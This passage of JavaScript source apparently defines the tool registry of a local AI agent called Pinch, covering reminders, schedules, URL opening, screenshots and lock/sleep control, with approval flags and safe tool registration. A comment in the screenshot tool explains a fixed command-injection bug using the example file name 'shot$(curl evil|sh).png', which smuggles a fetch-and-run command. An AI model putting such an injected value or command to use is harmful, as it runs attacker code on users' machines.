        channel: ctx.channel || "web",
        sessionId: ctx.sessionId || null,
        fired: false,
        createdAt: new Date().toISOString(),
      };
      addReminder(reminder);
      const inHowLong = humaniseDuration(parsed.at.getTime() - Date.now());
      return {
        ok: true,
        output:
          `Reminder set for ${formatClock(parsed.at, config.timezone)} (in ${inHowLong}): "${reminder.text}". ` +
          `Delivering to ${reminder.address}.`,
      };
    },
  },
  {
    name: "list_reminders",
    description: "List reminders that have not fired yet, soonest first.",
    parameters: { type: "object", properties: {} },
    async run() {
      const list = pendingReminders().sort((a, b) => String(a.at).localeCompare(String(b.at)));
      if (!list.length) return { ok: true, output: "No pending reminders." };
      return {
        ok: true,
        output: list
          .map((r) => `- ${formatClock(new Date(r.at), config.timezone)} · ${r.text} (${r.address})`)
          .join("\n"),
      };
    },
  },
  {
    name: "cancel_reminder",
    description: "Cancel pending reminders whose text matches a keyword.",
    parameters: {
      type: "object",
      properties: { query: stringProp("Keyword from the reminder text") },
      required: ["query"],
    },
    async run({ query }) {
      const needle = String(query).toLowerCase();
      const matches = pendingReminders().filter((r) => r.text.toLowerCase().includes(needle));
      if (!matches.length) return { ok: false, output: `No pending reminder matches "${query}".` };
      for (const r of matches) removeReminder(r.id);
      return { ok: true, output: `Cancelled ${matches.length} reminder(s): ${matches.map((r) => r.text).join(", ")}` };
    },
  },
  {
    name: "schedule",
    // Creating an unattended job is a machine-changing action: it will run
    // tools later, with nobody watching. It goes through the approval prompt.
    dangerous: true,
    description:
      "Manage tasks Pinch runs on a schedule without you. Use for 'every morning, summarise my " +
      "unread issues', 'each Monday at 8, check the build'. Cadence shapes: 'every 30m', " +
      "'daily at 09:00', 'weekly on mon at 8:00'. A scheduled run cannot use tools that need " +
      "approval (shell, write_file, screenshot, system_control) and cannot create more schedules.",
    parameters: {
      type: "object",
      properties: {
        action: { type: "string", enum: ["add", "list", "remove"], description: "What to do" },
        task: stringProp("For add: what to do each time, written as an instruction to yourself"),
        when: stringProp("For add: the cadence, e.g. 'daily at 09:00' or 'every 2h'"),
        query: stringProp("For remove: part of the task text to match"),
      },
      required: ["action"],
    },
    async run({ action, task, when, query }, ctx = {}) {
      if (action === "list") {
        const list = listSchedules();
        if (!list.length) return { ok: true, output: "No scheduled tasks." };
        return {
          ok: true,
          output: list
            .map((s) => `- ${s.when} · ${s.task} → ${s.address}${s.nextRun ? ` (next ${formatClock(new Date(s.nextRun), config.timezone)})` : ""}`)
            .join("\n"),
        };
      }

      if (action === "remove") {
        const needle = String(query || "").toLowerCase();
        const matches = listSchedules().filter((s) => s.task.toLowerCase().includes(needle));
        if (!matches.length) return { ok: false, output: `No schedule matches "${query}".` };
        for (const s of matches) deleteSchedule(s.id);
        return { ok: true, output: `Removed ${matches.length} schedule(s): ${matches.map((s) => s.task).join(", ")}` };
      }

      const result = addSchedule({
        task,
        when,
        address: ctx.target || "web:main",
        channel: ctx.channel || "web",
        sessionId: ctx.sessionId || null,
        timeZone: config.timezone,
      });
      if (!result.ok) return { ok: false, output: result.output };
      const next = result.schedule.nextRun
        ? formatClock(new Date(result.schedule.nextRun), config.timezone)
        : "unknown";
      return {
        ok: true,
        output: `Scheduled: "${result.schedule.task}" — ${result.schedule.cadence.label}, next at ${next}, delivering to ${result.schedule.address}.`,
      };
    },
  },
  {
    name: "open_url",
    description:
      "Open a web page in the user's default browser on this machine. Only http(s). Use for " +
      "'open YouTube', 'show me the docs', 'open my repo'.",
    parameters: {
      type: "object",
      properties: { url: stringProp("Full http(s) URL") },
      required: ["url"],
    },
    async run({ url }) {
      let parsed;
      try {
        parsed = new URL(String(url));
      } catch {
        return { ok: false, output: `Not a valid URL: ${url}` };
      }
      if (!/^https?:$/.test(parsed.protocol)) {
        return { ok: false, output: "Only http and https URLs can be opened." };
      }
      openUrl(parsed.toString());
      return { ok: true, output: `Opened ${parsed.toString()} in the default browser.` };
    },
  },
  {
    name: "screenshot",
    dangerous: true,
    description:
      "Capture the screen to an image file inside the workspace and return its path. " +
      "Use when the user asks what is on their screen or wants a screenshot of something.",
    parameters: {
      type: "object",
      properties: { path: stringProp("Optional output path (default data/screens/shot-<time>.png)") },
    },
    async run({ path }) {
      const guard = checkFilename(path);
      if (!guard.ok) return guard;
      const target = resolveInWorkspace(path || `screens/shot-${Date.now()}.png`);
      await mkdir(dirname(target), { recursive: true });

      // No shell, and no interpolation of the path into a program.
      //
      // This used to be runShell(`screencapture -x "${target}"`), which looked
      // careful and was a command injection: double quotes do not stop $(...)
      // inside them. `resolveInWorkspace` only proves the path is inside the
      // workspace — it says nothing about shell metacharacters, and
      // "shot$(curl evil|sh).png" is a perfectly legal name in there.
      //
      // Every one of these binaries takes its argument as argv, so let them.
      // The Windows script reads the path from the environment instead of
      // having it pasted into the script text, for the same reason.
      const WINDOWS_SCRIPT =
        "Add-Type -AssemblyName System.Windows.Forms,System.Drawing; " +
        "$b=[System.Windows.Forms.Screen]::PrimaryScreen.Bounds; " +
        "$bmp=New-Object System.Drawing.Bitmap $b.Width,$b.Height; " +
        "$g=[System.Drawing.Graphics]::FromImage($bmp); " +
        "$g.CopyFromScreen($b.Location,[System.Drawing.Point]::Empty,$b.Size); " +
        "$bmp.Save($env:PINCH_SHOT)";

      const candidates =
        process.platform === "darwin"
          ? [["screencapture", ["-x", target]]]
          : process.platform === "win32"
            ? [["powershell", ["-NoProfile", "-NonInteractive", "-Command", WINDOWS_SCRIPT]]]
            : [
                ["gnome-screenshot", ["-f", target]],
                ["scrot", ["-o", target]],
                ["import", ["-window", "root", target]],
                ["grim", [target]],
              ];

      const res = await runFirstAvailable(candidates, {
        timeoutMs: 15_000,
        env: process.platform === "win32" ? { ...childEnv(), PINCH_SHOT: target } : childEnv(),
      });

      if (!res.ok) {
        return {
          ok: false,
          output:
            `Could not take a screenshot (${String(res.stderr || "").trim() || "no capture tool found"}). ` +
            `On Linux install gnome-screenshot, scrot, imagemagick or grim.`,
        };
      }
      if (!existsSync(target)) {
        return { ok: false, output: `${res.used} reported success but wrote nothing to the target path.` };
      }
      return { ok: true, output: `Screenshot saved to ${relative(config.workspaceRoots[0], target) || target}` };
    },
  },
  {
    name: "system_control",
    dangerous: true,
    description:
      "Lock or sleep the user's computer. Only ever after they explicitly ask. " +
      "Actions: 'lock' or 'sleep'. Shutdown is deliberately not available.",
    parameters: {
      type: "object",
      properties: { action: { type: "string", enum: ["lock", "sleep"] } },
      required: ["action"],
    },
    async run({ action }) {
      const map = {
        darwin: { lock: "pmset displaysleepnow", sleep: "pmset sleepnow" },
        win32: {
          lock: "rundll32.exe user32.dll,LockWorkStation",
          sleep: "rundll32.exe powrprof.dll,SetSuspendState 0,1,0",
        },
        linux: { lock: "loginctl lock-session", sleep: "systemctl suspend" },
      };
      const cmd = (map[process.platform] || map.linux)[action];
      if (!cmd) return { ok: false, output: `Unknown action: ${action}` };
      const res = await runShell(cmd, { timeoutMs: 10_000 });
      return { ok: res.ok, output: res.ok ? `Done: ${action}.` : `Failed: ${res.stderr.trim()}` };
    },
  },
];

export const TOOL_MAP = new Map(TOOLS.map((t) => [t.name, t]));

/** Tool schemas in the shape both Ollama and OpenAI accept. */
export function toolSchemas() {
  // Derived from the map, not the array, so a tool registered at boot (an MCP
  // server, a user module) is offered to the model without touching this file.
  return [...TOOL_MAP.values()].map((t) => ({
    type: "function",
    function: { name: t.name, description: t.description, parameters: t.parameters },
  }));
}

export const DANGEROUS = new Set(TOOLS.filter((t) => t.dangerous).map((t) => t.name));

/**
 * Add a tool at runtime.
 *
 * Deliberately one function rather than exposing the map: registering has to
 * keep TOOL_MAP, DANGEROUS and the schema list in step, and a caller that
 * remembers two of the three is a bug waiting to happen.
 *
 * A name that already exists is refused rather than overwritten — a third-party
 * MCP server must never be able to replace `shell`.
 */
export function registerTool(tool, { dangerous = Boolean(tool.dangerous) } = {}) {
  if (!tool?.name || typeof tool.run !== "function") {
    throw new Error("registerTool needs { name, run }");
  }
  if (!/^[a-zA-Z0-9_-]{1,64}$/.test(tool.name)) {
    throw new Error(`tool name "${tool.name}" must be letters, digits, dash or underscore (max 64)`);
  }
  const existing = TOOL_MAP.get(tool.name);
  if (existing && existing !== tool) {
    throw new Error(`a tool named "${tool.name}" is already registered`);
  }
  TOOL_MAP.set(tool.name, { parameters: { type: "object", properties: {} }, ...tool });
  if (dangerous) DANGEROUS.add(tool.name);
  else DANGEROUS.delete(tool.name);
  return tool;
}
